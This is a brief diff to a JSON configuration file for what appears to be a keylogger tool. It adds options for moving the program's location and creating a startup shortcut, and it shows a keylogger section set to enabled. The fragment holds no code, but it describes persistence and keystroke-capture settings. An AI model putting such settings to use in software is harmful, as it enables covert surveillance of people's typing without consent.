@@ -1,5 +1,7 @@
 {
+    "move_location": "",
     "logs_location": "logs",
+    "create_startup_shortcut": false,
 
     "keylogger": {
         "enabled": true,
